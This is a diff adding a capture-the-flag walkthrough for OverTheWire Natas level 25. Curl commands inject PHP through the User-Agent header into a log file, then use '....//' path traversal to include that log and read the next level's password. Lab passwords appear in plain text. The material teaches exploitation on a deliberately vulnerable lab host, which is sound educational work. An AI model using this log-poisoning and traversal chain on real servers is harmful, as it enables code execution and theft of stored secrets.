@@ -556,9 +556,46 @@ Username: natas25
 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
 ```
 
-
 Reference:
 - http://php.net/manual/en/function.strcmp.php#108563
+
+### Level 25 - PHP `include` vulnerability
+```
+http://natas.natas.labs.overthewire.org/ natas GHF6X7YwACaYYssHVY05cFq83hRktl4c
+```
+
+This level is interesting as it is based on 2 flaws:
+- write arbitrary information to /var/www/natas/natas25/logs/natas25_\*.log, such as natas26's password, via the `include` function. *See the [include vulnerability](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#PHP) on Wikipedia*
+- read any natas25-readable file, such as the log file we just wrote into.
+
+#### 1. Write arbitrary data
+Vulnerable code at l.57-59:
+```php
+$log = $log . " " . $_SERVER['HTTP_USER_AGENT']; // we can control this value
+$fd = fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a"); // we also know and may control this value
+fwrite($fd,$log);
+```
+Let's write the content of `/natas/natas_webpass/natas26` to our log file:
+
+```bash
+$ curl -v --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c http://natas25.natas.labs.overthewire.org?lang=natas_webpass -H "User-Agent:<?php echo file_get_contents('/etc/natas_webpass/natas26') ?>"
+< Set-Cookie: PHPSESSID=t392uh11jernde0e8d5jco84m2;
+</form>
+</div>
+* Connection #0 to host natas25.natas.labs.overthewire.org left intact
+```
+As we can see, the HTML ends up with `</div>` instead of `</html>` so we hit `exit()`, which means we successfully entered in `logRequest()`. Also, take note of the `PHPSESSID`.
+
+### 2. Read a file
+```bash
+$ curl -v --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c http://natas25.natas.labs.overthewire.org?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_t392uh11jernde0e8d5jco84m2.log
+</div>
+
+[17.12.2018 16::49:12] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+ "Illegal file access detected! Aborting!"
+<br />
+```
+
 
 ### Level  -
 ```
